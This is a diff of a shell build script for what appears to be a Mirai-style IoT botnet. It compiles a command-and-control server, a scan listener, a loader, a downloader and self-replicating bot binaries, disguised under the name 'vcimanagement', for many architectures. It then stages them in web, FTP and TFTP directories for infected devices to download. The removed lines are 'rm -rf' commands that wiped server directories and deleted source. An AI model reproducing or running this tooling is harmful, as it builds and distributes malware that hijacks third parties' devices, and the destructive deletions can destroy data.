@@ -23,17 +23,13 @@ then
 	domain="-DUSEDOMAIN"
     domainres=" with domain"
 fi
-rm -rf ~/release
+
 mkdir ~/release
-rm -rf /var/www/html
-rm -rf /var/lib/tftpboot
-rm -rf /var/ftp
 mkdir /var/ftp
 mkdir /var/lib/tftpboot
 mkdir /var/www/html
 mkdir /var/www/html/bins
 go build -o loader/cnc cnc/*.go
-rm -rf ~/cnc
 mv ~/loader/cnc ~/
 go build -o loader/scanListen scanListen.go
 echo "COMPILING i586"
@@ -61,7 +57,7 @@ compile_bot sh4 vcimanagement.sh4 "-static -DSELFREP"
 cp release/vcimanagement* /var/www/html/bins
 cp release/vcimanagement* /var/ftp
 mv release/vcimanagement* /var/lib/tftpboot
-rm -rf release
+
 ###################################################################
 gcc -static -O3 -lpthread -pthread ~/loader/src/*.c -o ~/loader/loader
 ###################################################################
@@ -88,4 +84,3 @@ powerpc-strip -S --strip-unneeded --remove-section=.note.gnu.gold-version --remo
 sh4-strip -S --strip-unneeded --remove-section=.note.gnu.gold-version --remove-section=.comment --remove-section=.note --remove-section=.note.gnu.build-id --remove-section=.note.ABI-tag --remove-section=.jcr --remove-section=.got.plt --remove-section=.eh_frame --remove-section=.eh_frame_ptr --remove-section=.eh_frame_hdr ~/dlr/release/dlr.sh4
 sparc-strip -S --strip-unneeded --remove-section=.note.gnu.gold-version --remove-section=.comment --remove-section=.note --remove-section=.note.gnu.build-id --remove-section=.note.ABI-tag --remove-section=.jcr --remove-section=.got.plt --remove-section=.eh_frame --remove-section=.eh_frame_ptr --remove-section=.eh_frame_hdr ~/dlr/release/dlr.spc
 mv ~/dlr/release/dlr* ~/loader/bins
-rm -rf ~/dlr ~/loader/src ~/bot ~/scanListen.go ~/Projects ~/build.sh
